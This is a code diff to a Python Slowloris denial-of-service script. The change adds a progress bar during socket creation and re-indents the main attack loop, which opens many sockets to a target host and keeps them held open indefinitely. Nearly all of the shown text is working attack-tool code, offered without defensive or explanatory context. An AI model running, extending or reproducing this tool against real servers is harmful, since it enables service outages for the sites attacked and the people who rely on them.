@@ -200,32 +200,60 @@ def slowloris_iteration():
             break
 
 
+            # Progress bar function
+def printProgressBar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█', printEnd="\r"):
+                """
+                Call in a loop to create terminal progress bar
+                @params:
+                    iteration   - Required  : current iteration (Int)
+                    total       - Required  : total iterations (Int)
+                    prefix      - Optional  : prefix string (Str)
+                    suffix      - Optional  : suffix string (Str)
+                    decimals    - Optional  : positive number of decimals in percent complete (Int)
+                    length      - Optional  : character length of bar (Int)
+                    fill        - Optional  : bar fill character (Str)
+                    printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
+                """
+                percent = str(iteration)+ "/" + str(total)
+                filledLength = int(length * iteration // total)
+                bar = fill * filledLength + '-' * (length - filledLength)
+                print(f'\r{prefix} |{bar}| {percent} {suffix}', end=printEnd)
+                # Print New Line on Complete
+                if iteration == total:
+                    print()
+
+            # Main function to run the slowloris attack
 def main():
-    ip = args.host
-    socket_count = args.sockets
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+                ip = args.host
+                socket_count = args.sockets
+                logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
-    logging.info("Creating sockets...")
-    for _ in range(socket_count):
-        try:
-            logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
-        except socket.error as e:
-            logging.debug(e)
-            break
-        list_of_sockets.append(s)
+                logging.info("Creating sockets...")
+                # Create initial sockets and show progress
+                for i in range(socket_count):
+                    try:
+                        #logging.debug("Creating socket nr %s", i)
+                        s = init_socket(ip)
+                    except socket.error as e:
+                        logging.debug(e)
+                        break
+                    list_of_sockets.append(s)
 
-    while True:
-        try:
-            slowloris_iteration()
-        except (KeyboardInterrupt, SystemExit):
-            logging.info("Stopping Slowloris")
-            break
-        except Exception as e:
-            logging.debug("Error in Slowloris iteration: %s", e)
-        logging.debug("Sleeping for %d seconds", args.sleeptime)
-        time.sleep(args.sleeptime)
+                    # Update progress bar during initial socket creation
+                    printProgressBar(i + 1, socket_count, prefix="Creating sockets:", suffix="Completed", length=50)
 
+                # Run the Slowloris attack
+                while True:
+                    try:
+                        slowloris_iteration()
+                    except (KeyboardInterrupt, SystemExit):
+                        logging.info("Stopping Slowloris")
+                        break
+                    except Exception as e:
+                        logging.debug("Error in Slowloris iteration: %s", e)
+
+                    logging.debug("Sleeping for %d seconds", args.sleeptime)
+                    time.sleep(args.sleeptime)
 
 if __name__ == "__main__":
     main()
